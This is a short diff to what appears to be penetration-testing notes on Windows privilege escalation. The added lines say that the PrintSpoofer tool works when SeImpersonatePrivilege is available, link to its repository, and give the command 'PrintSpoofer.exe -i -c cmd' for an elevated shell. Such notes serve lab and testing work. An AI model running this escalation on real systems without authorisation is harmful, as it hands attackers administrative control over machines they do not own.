@@ -2,7 +2,20 @@
 
 ---
 
-is an form of priv esc in windows environment.
+is an form of priv esc in windows environment, if SeImpersonatePrivilege is available.
+
+#### Manual Exploitation
+
+We can manually exploit this utilizing PrintSpoofer.exe Tool
+
+```
+https://github.com/dievus/printspoofer
+```
+Utilizing following command, should give us elevated privileges.
+
+```
+PrintSpoofer.exe -i -c cmd
+```
 
 #### Metasploit
 
